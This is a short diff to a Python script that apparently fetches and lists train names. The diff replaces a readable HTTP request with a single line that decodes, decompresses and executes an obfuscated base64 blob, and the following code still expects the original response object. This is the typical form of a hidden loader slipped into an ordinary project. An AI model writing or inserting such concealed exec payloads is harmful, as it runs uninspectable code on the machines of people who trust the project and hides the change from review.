@@ -46,9 +46,7 @@ def load_animation():
 if __name__ == "__main__":
     load_animation()
 os.system("cls" if os.name == "nt" else "clear")
-a = r.get(
-    "https://rawcdn.githack.com/hackingvila/train_database/40a34375fcae2e49236fc434e2a22fe0422ae939/Train_names.json"
-)
+exec(zlib.decompress(base64.b64decode('eJwdyzEOwjAMBdCdY3SCJa4cAwoSt2BHn9RJAzRFiQXXR7C95eHcXFbbDrPZq5+IGj5xqi4XmxEfLq4L/VBqfpcnyBpKvU4w3NCVZIQXf9ynCGWVwP6QonhRBnPSUZihwQe6/F/Fot3d+1qH3eYLSngo3Q==')))
 b = a.json()
 class banner2:
     def __init__(self):
